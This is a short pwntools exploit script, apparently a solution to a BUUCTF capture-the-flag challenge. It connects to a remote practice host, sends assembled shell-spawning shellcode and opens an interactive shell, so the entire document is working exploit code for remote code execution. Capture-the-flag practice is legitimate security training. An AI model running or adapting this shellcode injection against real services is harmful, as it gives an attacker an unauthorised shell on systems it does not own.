from pwn import *

sh=remote("node5.buuoj.cn",28262)

shellcode=asm(shellcraft.sh())
sh.sendline(shellcode)

sh.interactive()
